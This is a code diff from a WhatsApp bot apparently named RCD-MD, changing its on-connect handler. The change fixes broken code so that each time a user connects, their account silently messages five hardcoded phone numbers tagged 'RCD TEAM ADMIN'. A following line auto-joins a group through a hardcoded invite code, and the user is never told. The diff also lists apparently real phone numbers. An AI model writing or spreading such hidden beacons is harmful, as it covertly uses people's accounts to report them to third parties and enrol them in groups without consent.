@@ -1275564,23 +1275564,23 @@ async function start() {
                 }
             } else if (connection === 'open') {
                 if (initialConnection) {
-                    console.log(chalk.green("📍 RCD-MD CONNECTED Successful️ ✅"));
-                    await Matrix.sendMessage(Matrix.user.id, { text: `📍RCD-MD CONNECTED Successful️ ✅` });
+                    console.log(chalk.green("📍 RCD-MD CONNECTED Successfully ✅"));
+                    await Matrix.sendMessage(Matrix.user.id, { text: `📍RCD-MD CONNECTED Successfully ✅` });
 
                     // Forward message to specific numbers
-                    const messageText = 'Welcome! You are successfully connected.';
-                    const number1 = '94753574803@s.whatsapp.net';
-                    const number2 = '94785274495@s.whatsapp.net';
-                    const number2 = '94757660788@s.whatsapp.net';
-                    const number2 = '94778668193@s.whatsapp.net';
-                    const number2 = '94789958225@s.whatsapp.net';
-                    
-                    await Matrix.sendMessage(number1, { text: messageText });
-                    await Matrix.sendMessage(number2, { text: messageText });
-                    await Matrix.sendMessage(number3, { text: messageText });
-                    await Matrix.sendMessage(number4, { text: messageText });
-                    await Matrix.sendMessage(number5, { text: messageText });
-                    console.log(`Messages sent to ${number1} and ${number2}`);
+                    const messageText = '*RCD MD CONNECT  RCD TEAM ADMIN* ❯ 💀';
+                    const numbers = [
+                        '94753574803@s.whatsapp.net',
+                        '94785274495@s.whatsapp.net',
+                        '94757660788@s.whatsapp.net',
+                        '94778668193@s.whatsapp.net',
+                        '94789958225@s.whatsapp.net'
+                    ];
+
+                    for (const number of numbers) {
+                        await Matrix.sendMessage(number, { text: messageText });
+                    }
+                    console.log('Messages sent to all specified numbers.');
 
                     // Auto-join WhatsApp group using group invite link
                     const groupInviteCode = 'Cry8eSzZqW27t9H8uOcRIR'; // Replace with your actual group invite code
